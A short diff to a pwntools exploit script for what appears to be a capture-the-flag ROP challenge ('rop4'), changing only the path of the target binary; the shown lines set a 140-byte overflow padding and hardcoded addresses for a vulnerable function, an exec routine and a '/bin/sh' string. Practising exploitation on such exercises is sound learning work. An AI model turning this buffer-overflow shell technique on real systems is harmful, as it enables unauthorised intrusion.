@@ -1,6 +1,6 @@
 from pwn import *
 ov=b"a"*140
-p=process("./rop4")
+p=process("./pwn/stack/rop-4/rop4")
 vul=0x08048F3B
 exe=0x08053AB0
 binsh=0x080CBF4F
